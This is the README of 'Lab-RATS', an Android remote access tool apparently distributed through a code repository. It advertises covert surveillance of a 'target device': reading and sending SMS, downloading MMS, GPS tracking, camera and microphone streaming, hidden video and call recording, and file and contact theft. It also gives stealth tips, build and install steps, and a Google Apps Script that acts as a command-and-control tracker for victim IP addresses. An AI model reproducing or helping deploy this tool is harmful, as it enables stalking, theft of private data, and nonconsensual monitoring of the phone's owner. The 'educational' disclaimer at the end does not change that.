[![Screenshot-2026-06-28-at-8-21-29-AM.png](https://i.postimg.cc/rFGWqKMp/Screenshot-2026-06-28-at-8-21-29-AM.png)](https://postimg.cc/Yh9j324c)

## About

**Lab-RATS** is a **Powerful** and **lightweight Android Remote Administration Tool** *(RAT)* developed by **K4N3CO.LABS**. This tool allows for **remote monitoring and management** of Android devices through a user friendly **web-based interface** and **works** on the **newest updated 2026 Android software**. *(SDK 36)*

---

## Features

- **Signed & Unsigned APKs**: **Automatically** generates both `signed.apk` *(for release)* and `unsigned.apk`.
- **Advanced Identity**: Customize **App Name, Package Name** *(ID)*, and **Min SDK**.
- **Stealth Mode**: Randomly **generates Version Name** and **Version Code** to look like **legitimate updates**.
- **Smart Logo**:
  - **Automatically resizes** any image to all **Android densities**.
  - Optional **Transparency Generation** *(removes white backgrounds)*.
  - Forces "**Legacy Mode**" to bypass adaptive icons on newer Androids.

## 🚀 The Fun Stuff

-   **Live GPS Location Data**:
    -   **One Click** Opens up **Google Maps** in Browser to the **exact current location** of the **Target Device**.
-   **View MMS/Picture Messages**: *(Game Changer!...You're Welcome in Advance...)*
    -   **Browse** & **Download ANY MMS/Picture Messages** that were **Sent** or **Received** by **Target Device**. *(Unless deleted off device)*
-   **View SMS/Text Messages & Send SMS/Text Messages**:
    -   **Browse** & **Copy ANY SMS/Text Messages** that were **Sent** or **Received** by **Target Device**. *(Unless deleted off device)*
    -   **Send Text Messages From Target Phone** to **ANY Number**.
-   **Live Screen Capture, Stream, & Record**: *(Work In Progress. All other features are working as of 06/28/2026)*
    -   Take **Live Screenshots**. *(WIP)*
    -   Capture **Live Screen** Recordings. *(WIP)*
    -   View **User Screen Activity** in **Real-Time**. *(WIP)*
-   **Live Camera Streaming**: View **real-time camera feed** from both **front and back cameras** directly in your **browser**.
-   **Background Video Recording**: **Record high-quality video** in the background **without user knowledge**.
-   **Photo Capture & Flashlight Blink**:
    -   Take **instant photos** from **any** available camera.
    -   Click the "**Blink Flash" button** to make the **Cameras Flashlight blink a few times** for fun.
-   **Audio Management**: 
    -   **Live Microphone** Recording.
    -   **Automatic Call** Recording *(Incoming/Outgoing)*.
-   **File Manager**: **Browse, download, and manage files** located on **internal** and **external** storage.
-   **Communication Logs**:
    -   **Full Call Log** access.
    -   **Contact list** extraction.
-   **Device Information**: Detailed **System, Network, Hardware**, and **Battery Status**.
-   **Auto-Reporting**: **Automatically sends** device IP and connection links to a confgured **Google Sheet** .

---

## Screenshots
<p align="center"> --- > APK builder < ---

<p align="center"> 
<a href='https://postimg.cc/64fbtNKM' target='_blank'><img src='https://i.postimg.cc/64fbtNKM/APK-builder-pic.jpg' border='0' alt='APK-builder-pic'></a>

<p align="center"> --- > Main Page of Android App (APK) Installed on Target Device < ---

<p align="center">
 <a href='https://postimg.cc/2VbLY8CV' target='_blank'><img src='https://i.postimg.cc/2VbLY8CV/Lab-RATS-APK-screen.jpg' border='0' alt='Lab-RATS-APK-screen'></a>

<p align="center"> --- > Live Streaming Target Device from PC through the Web-Based Interface < ---

<a href="https://postimg.cc/LJpWkwWh" target="_blank"><img src="https://i.postimg.cc/LJpWkwWh/Lab-RATS-WEBHomepage.png" alt="Lab-RATS-WEBHomepage"></a> <a href="https://postimg.cc/ftmztxd9" target="_blank"><img src="https://i.postimg.cc/ftmztxd9/Lab-RATS-Camera-menu.png" alt="Lab-RATS-Camera-menu"></a> <a href="https://postimg.cc/gX8zXvh6" target="_blank"><img src="https://i.postimg.cc/gX8zXvh6/Lab-RATS-Cam-record.png" alt="Lab-RATS-Cam-record"></a> <a href="https://postimg.cc/YGYrG1FG" target="_blank"><img src="https://i.postimg.cc/YGYrG1FG/Lab-RATS-Audio.png" alt="Lab-RATS-Audio"></a> <a href="https://postimg.cc/R3G2ZdXL" target="_blank"><img src="https://i.postimg.cc/R3G2ZdXL/Lab-RATS-SMS.png" alt="Lab-RATS-SMS"></a> <a href="https://postimg.cc/HcXYcQMB" target="_blank"><img src="https://i.postimg.cc/HcXYcQMB/Lab-RATS-MMS.png" alt="Lab-RATS-MMS"></a> 

---

## 🧠 Direct IPv6 Access

During **security research**, an **interesting behavior** in **modern Android networking** was **discovered**. When an Android device **connects to mobile data** *(and some modern WiFi networks)*, it is assigned a **Public IPv6 Address**.

**Unlike** IPv4, which is **heavily restricted** by NAT *(Network Access Translation)* and requires **complex port forwarding** to access from the outside, **IPv6 addresses are often directly routeable on the public internet**.

### How Lab-RATS Exploit This:

1.  **Local HTTP Server**: The Android app starts a **lightweight HTTP server** on the device *(Port 8080)*.
2.  **The IPv6 Feature/Bug**: Because the device has a **Public IPv6,** you can access this server **directly** from **anywhere in the world** by typing the **IP address** into your **browser**. *(No router setup, No firewall bypass, No local tunneling)*
3.  **The Problem** *(Dynamic IPs)*: **Mobile** networks **frequently rotate IPs**. Your **target's IP changes** every time they **reconnect**.
4.  **The Solution** *(Google Sheets)*: **Lab-RATS** uses a **Google Sheet** as a **"Command & Control"(C2)** tracker. The app **detects** its own **Public IPv6** and **discreetly posts** it to your **Google Sheet**. To use **open your sheet**, **click the IP link**, and you will connect **directly to the device**.

> `**This method turns Android phones into public web servers and uses a Google Sheet as a dynamic phonebook to find them.**`.

---

## 🛠️ Get Started

### 1. Prerequisites:
-   **Java 11 or 21** installed on your **PC**.
-   An **Android** device *(target)*.
-   A **Google Sheet URL** for **IP reporting**.

### 2. Build the APK:
1.  **Download** & **Extract** the zip file.
2.  **Navigate** `cd /Lab-RATS/app-builder/` directory.
3.  **Run** the **app-builder script**:
    -   **Windows**: Double-click `build.bat`
    -   **Linux/Mac**: `chmod +x build.sh` then `./build.sh`
4.  **Follow** the **on-screen prompts** to **configure APK**:
    -   **Pick** Number 1 to **build the APK**
    -   **App Name**: *(Default: Lab-RATS)*
    -   **Package Name**: *(Default: com.labs.k4n3co)*
    -   **Google Sheet URL**: Paste in your **Apps Script Web App URL** *(Google Sheet set-up instructions below)*.
5.  The **completed signed** & **unsigned APK's** will be **generated** in `/app-builder/output/`.

### 3. Usage:
1.  **Install** the **generated APK** from the `/output` folder onto the **target device**.
2.  **Open the App** and **grant all requested permissions**. *(Block notification permissions if you want the app to be more discreet)*
3.  Click the **"BYPASS_POWER_LIMITS"** button to ensure background **persistence**.
4.  Click the **"INITIALIZE SERVER"** button to **start server**.
5.  The **Device IP** will appear in your **Google Sheet**. Open the IP link to **access the web-based interface**.

---

## 📊 Google Sheet Setup 

1. Create a **Google Sheet**
2. Go to **Extensions** → **Apps Script**
3. **Paste** in the **Code** below:

```javascript
// Lab-RATS Remote Reporting Script
function doPost(e) {
  try {
    var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
    var data = JSON.parse(e.postData.contents);
    
    var timestamp = new Date();
    var device = data.device;
    var network = data.network;
    var ip = data.ip;
    var port = data.port;
    var link = data.link;
    
    // Add data to the next available row
    sheet.appendRow([timestamp, device, network, ip, port, link]);
    
    return ContentService.createTextOutput("Success").setMimeType(ContentService.MimeType.TEXT);
  } catch (err) {
    return ContentService.createTextOutput("Error: " + err.message).setMimeType(ContentService.MimeType.TEXT);
  }
}

// Optional: Run this once to create the header row
function setupSheet() {
  var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
  sheet.appendRow(["Timestamp", "Device Model", "Network Type", "IP Address", "Port", "Control Panel Link"]);
  sheet.getRange("A1:F1").setFontWeight("bold").setBackground("#051820").setFontColor("white");
}
```
4. **Deploy** → **Web App** → **Anyone**
5. **Copy URL** → **Paste** → **App-builder** when asked. 


---------------------------*Example Google Sheet - Running & Properly Configured*-------------------------------

[![Lab-RATS-Googlesheet.png](https://i.postimg.cc/YC5Bqyd4/Lab-RATS-Googlesheet.png)](https://postimg.cc/TKJ4tQMG)

---

## ⭐ **Support the Project**

If you find **Lab-RATS** useful, **please** consider giving the project a **Star** ⭐ — it **helps** a lot!

**Feel free** to **Open Issues** or **Submit Pull Requests**. **Contributions** are **always welcome**!

**Donations** *(optional but greatly appreciated)*

**Bitcoin: (BTC)**

```
bc1q6lmkuju3kf7f8624fwt5qs7k5mf63mekgcnzf4
```

---

## ⚠️ Disclaimer
This **tool** is for **educational** and **authorized security testing purposes only**. The **developers are NOT responsible** for **ANY** **misuse** of this application. **Please use it responsibly**. **Enjoy**!

---

© 2026 K4N3CO.LABS
